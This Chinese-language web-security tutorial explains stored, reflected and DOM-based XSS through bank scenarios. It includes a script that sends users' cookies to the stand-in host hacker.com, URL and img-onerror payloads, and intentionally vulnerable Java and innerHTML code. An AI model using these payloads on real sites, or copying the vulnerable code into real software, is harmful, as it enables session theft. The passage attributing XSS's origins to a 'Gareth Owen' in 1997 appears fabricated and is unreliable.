### XSS跨站脚本攻击

前面我们介绍了两种攻击方式，不过都是从外部干涉，在外部无法干涉的情况下，我们也可以从内部击溃网站，接下来我们隆重介绍XSS跨站脚本攻击方式。

XSS（跨站脚本攻击）是一种常见的网络安全漏洞，攻击者通过在合法网站中注入恶意脚本代码来攻击用户。当用户访问受到注入攻击的页面时，恶意代码会在用户的浏览器中执行，从而导致攻击者能够窃取用户的敏感信息、诱导用户操作、甚至控制用户的账号。

XSS攻击常见的方式有三种：

1. 存储型XSS攻击：攻击者将恶意代码存储到目标网站的数据库中，当其他用户访问包含恶意代码的页面时，恶意代码会被执行。
2. 反射型XSS攻击：攻击者将恶意代码嵌入到URL中，当用户点击包含恶意代码的URL时，恶意代码会被执行。
3. DOM-based XSS攻击：攻击者利用前端JavaScript代码的漏洞，通过修改页面的DOM结构来执行恶意代码。

在一些社交网站上，用户可以自由发帖，而帖子是以富文本形式进行编辑和上传的，发送给后台的帖子往往是直接以HTML代码的形式，这个时候就会给黑客可乘之机了。


![[Pasted image 20260521174159.png]]

正常情况下，用户发帖会向后端上传以下内容，这些是经过转换得到的正常HTML代码，方便后续直接展示：

```html
<div class="content ql-editor">
  <p>
    <strong>萨达睡觉了大数据</strong>
  </p>
  <p>撒大大撒大声地</p>
</div>
```

而现在，黑客不走常规的方式发帖，而是发送以下内容给服务端：

```html
<div class="content ql-editor">
  <p οnlοad="alert('xss')">
    <strong>萨达睡觉了大数据</strong>
  </p>
  <p>撒大大撒大声地</p>
</div>
```

可以看到`p`标签上添加了一段JS恶意脚本，黑客可以利用这种特性，获取用户的各种信息，甚至直接发送到他的后台，这样，我们的个人信息就从网站内部被泄露了。

XSS漏洞最早被发现是在1996年，由于JavaScript的出现，导致在Web应用程序中存在了一些安全问题。在1997年，高智文(Gareth Owen)也就是“XSS之父”，在他的博客中描述了一种称为“脚本注入”(script injection)的攻击技术，这就是XSS漏洞的前身。从那时起，XSS漏洞便成为了Web应用程序中的一种常见安全漏洞。



这种攻击一般需要前端配合后端进行防御，或者后端对前端发送的内容进行安全扫描并处理，有机会我们会分享如何防范此类攻击。

## 一、 XSS 的三大经典家族（原理与案例）

根据恶意脚本“潜伏”在哪里，XSS 主要分为三大类。我们用白马银行的业务场景逐一解剖：

### 1. 存储型 XSS（Stored XSS）—— 威力最大、影响最广

恶意脚本被**死死地写入了后端的数据库中**。只要有任何用户访问包含该数据的页面，就会中招。

- **场景：** 白马银行有一个“转账留言板”或者“用户评论区”。
    
- **黑客下毒：** 黑客在留言框里不输入正常的文字，而是输入了一段 JS 代码：
    
    ```HTML
    <script>
        // 悄悄把当前用户的 Cookie 发送给黑客的服务器
        new Image().src = "http://www.hacker.com/steal?cookie=" + document.cookie;
    </script>
    ```
    
- **后端漏洞：** 后端程序员太信任用户了，直接执行了 `insert into comment ...` 把这串代码一字不差地存进了 MySQL 数据库。
    
- **悲剧发生：** 银行管理员或者其他用户打开“查看留言”页面。Thymeleaf 或 JSP 从数据库取出这行数据，直接渲染成了 HTML。用户的浏览器一看：`“哦，这里有个 <script> 标签，我得执行它！”`。 轰！该用户的 Session ID 瞬间被发送到了黑客的服务器。
    

### 2. 反射型 XSS（Reflected XSS）—— 诱骗点击、一次性伤害

恶意脚本**不经过数据库**，而是作为 URL 参数的一部分发送给服务器，服务器又“原封不动”地把这个参数反射回前端，诱骗用户自己触发。

- **场景：** 白马银行有一个搜索功能，点击搜索后页面会提示：`“您搜索的关键词是：xxx”`。
    
- **后端的愚蠢代码：**
    
    ```Java
    // 没做任何过滤，直接把前端传来的 keyword 塞进 Model 传回页面
    model.addAttribute("msg", keyword); 
    ```
    
- **黑客下毒：** 黑客精心伪造了一个带有恶意参数的超级长链接，发给受害者： `http://bank.com/search?keyword=<script>alert('你被黑了')</script>`
    
- **悲剧发生：** 受害者点击了这个链接。银行服务器收到请求，把 `keyword` 里的脚本原封不动地塞进网页返回。受害者的浏览器收到网页，当场执行了这段弹窗（或偷 Cookie）的脚本。因为像镜子一样反射了回去，所以叫反射型。
    

### 3. DOM 型 XSS（DOM-based XSS）—— 纯前端内鬼，不经过后端

这种 XSS 最隐蔽，因为**恶意脚本根本不会传给后端服务器**。它完全是由于前端 JavaScript 代码写得不安全，在浏览器本地拼接 DOM 树时逻辑翻车导致的。

- **前端的愚蠢代码（JS）：**
    
    ```JavaScript
    // 从浏览器的 URL 栏直接肉眼抓取参数
    const params = new URLSearchParams(window.location.search);
    const name = params.get("name");
    // 🎯 致命漏洞：使用 innerHTML 允许字符串被当成代码解析
    document.getElementById("welcome").innerHTML = "欢迎你，" + name;
    ```
    
- **黑客下毒：** 诱骗用户点击：`http://bank.com/index.html?name=<img src=x onerror=alert(1)>`
    
- **悲剧发生：** 请求发出去时，后端可能根本不关心 `name` 参数。但网页下载到本地后，前端 JS 开始执行，把这段带有 `onerror` 属性的图片标签强行用 `innerHTML` 塞进了网页。浏览器在加载图片失败时，顺手就执行了后面的 JavaScript 恶意代码。
